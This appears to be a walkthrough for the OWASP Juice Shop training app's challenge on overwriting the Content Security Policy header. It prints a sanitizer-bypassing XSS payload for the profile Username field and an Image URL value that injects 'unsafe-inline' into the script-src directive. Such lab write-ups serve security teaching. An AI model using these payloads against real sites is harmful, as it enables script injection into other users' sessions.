# Overwrite Content Security Policy Header

1. Navigate to [https://localhost:88](http://localhost:88) or [https://demo.owasp-juice.shop](https://demo.owasp-juice.shop).

1. Log in with an account.

1. A forced directory search, nikto scan, or other scan finds the /profile subdirectory. Manually navigate to it.

1. Enter this following value in _Username_:
    ```
    <script>alert(`xss)</script>`
    ```
    This is sanitized, but the sanitizer is naive.

1. Enter the following in _Username_:
    ```
    <<a|ascript>alert(`xss)</script>`
    ```

1. Set the _Image URL_ field to https://placekitten/300/300.

1. Note that the Content-Security-Header on the response page contains an entry like:
    ```
    /assets/public/images/uploads/22.jpg; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
    ```
1. Submit http://not.an.image/image.png in the _Image URL_ and view the response:
    ```
    http://not.an.image/image.png; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
    ```
1. Now submit the following text for the _Image URL_:
    ```
    http://not.an.image/image.png script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
    ```